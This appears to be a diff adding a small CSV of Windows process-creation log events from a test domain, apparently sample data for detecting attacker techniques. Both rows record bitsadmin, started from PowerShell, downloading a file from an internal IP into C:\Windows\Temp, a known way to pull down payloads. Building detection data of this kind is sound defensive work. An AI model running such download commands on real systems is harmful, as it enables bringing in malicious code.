@@ -1,0 +1,5 @@
+"_time",ComputerName,User,Image,CommandLine,ParentImage
+"2026-11-04T12:17:51.000+0000","SRV.test.local","NOT_TRANSLATED
+TEST\Administrator","C:\Windows\System32\bitsadmin.exe","""C:\Windows\system32\bitsadmin.exe"" /transfer myjob /download /priority normal http://192.168.20.200/a.txt C:\Windows\Temp\a.txt","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+"2026-11-04T12:21:28.000+0000","SRV.test.local","NOT_TRANSLATED
+TEST\Administrator","C:\Windows\System32\bitsadmin.exe","""C:\Windows\system32\bitsadmin.exe"" /transfer myjob /download /priority normal http://192.168.20.200/a.txt C:\Windows\Temp\a.txt","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
